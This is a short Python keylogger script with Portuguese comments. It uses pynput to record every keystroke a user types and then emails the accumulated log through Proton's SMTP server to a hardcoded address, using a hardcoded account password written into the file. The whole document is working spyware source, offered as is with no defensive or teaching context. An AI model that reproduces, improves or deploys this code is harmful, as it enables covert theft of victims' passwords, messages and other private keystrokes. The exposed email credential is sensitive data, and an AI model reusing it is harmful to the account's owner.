from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ""

#c0nfiguraçoes do email
EMAIL_REMETENTE = "allaniury@proton.me"
EMAIL_DESTINATARIO = "allaniury@proton.me"
EMAIL_SENHA = "2PW51997MENDES"

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['Subject'] = 'dados do keylogger'
        msg['From'] = EMAIL_REMETENTE
        msg['To'] = EMAIL_DESTINATARIO

    try:
        with smtplib.SMTP('smtp.protonmail.com', 587) as server:
            server.starttls()
            server.login(EMAIL_REMETENTE, EMAIL_SENHA)
            server.send_message(msg)
            server.quit()
    except Exception as e:
        print(f"Erro ao enviar email: {e}")
    
    log = ""
#agenda o envio do email a cada 60 segundos
Timer(60, enviar_email).start()


def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.tab:
            log += "\t"
        elif key == keyboard.Key.backspace:
            log += "BACKSPACE"
        elif key == keyboard.Key.esc:
            log += "[ESC]"
        else: 
            pass


#iniciar o keylogger e o envio do email
with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()  # Inicia o envio do email
    listener.join()